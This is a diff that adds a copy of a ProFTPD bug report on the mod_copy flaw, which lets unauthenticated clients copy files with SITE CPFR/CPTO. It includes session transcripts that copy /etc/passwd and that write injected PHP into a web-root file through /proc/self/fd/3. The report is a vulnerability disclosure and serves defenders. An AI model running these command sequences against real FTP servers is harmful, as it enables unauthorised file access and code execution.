@@ -1,0 +1,57 @@
+Description TJ Saunders 2015-04-07 16:35:03 UTC
+Vadim Melihow reported a critical issue with proftpd installations that use the
+mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands
+to be used by *unauthenticated clients*:
+
+---------------------------------
+Trying 80.150.216.115...
+Connected to 80.150.216.115.
+Escape character is '^]'.
+220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]
+site help
+214-The following SITE commands are recognized (* =>'s unimplemented)
+214-CPFR <sp> pathname
+214-CPTO <sp> pathname
+214-UTIME <sp> YYYYMMDDhhmm[ss] <sp> path
+214-SYMLINK <sp> source <sp> destination
+214-RMDIR <sp> path
+214-MKDIR <sp> path
+214-The following SITE extensions are recognized:
+214-RATIO -- show all ratios in effect
+214-QUOTA
+214-HELP
+214-CHGRP
+214-CHMOD
+214 Direct comments to root@www01a
+site cpfr /etc/passwd
+350 File or directory exists, ready for destination name
+site cpto /tmp/passwd.copy
+250 Copy successful
+-----------------------------------------
+
+He provides another, scarier example:
+
+------------------------------
+site cpfr /etc/passwd
+350 File or directory exists, ready for destination name
+site cpto <?php phpinfo(); ?>
+550 cpto: Permission denied
+site cpfr /proc/self/fd/3
+350 File or directory exists, ready for destination name
+site cpto /var/www/test.php
+
+test.php now contains
+----------------------
+2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
+(slon-P5Q.lan[192.168.3.193]): error rewinding scoreboard: Invalid argument
+2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
+(slon-P5Q.lan[192.168.3.193]): FTP session opened.
+2015-04-04 02:01:27,943 slon-P5Q proftpd[16255] slon-P5Q
+(slon-P5Q.lan[192.168.3.193]): error opening destination file '/<?php
+phpinfo(); ?>' for copying: Permission denied
+-----------------------
+
+test.php contains contain correct php script "<?php phpinfo(); ?>" which
+can be run by the php interpreter
+
+Source: http://bugs.proftpd.org/show_bug.cgi?id=4169
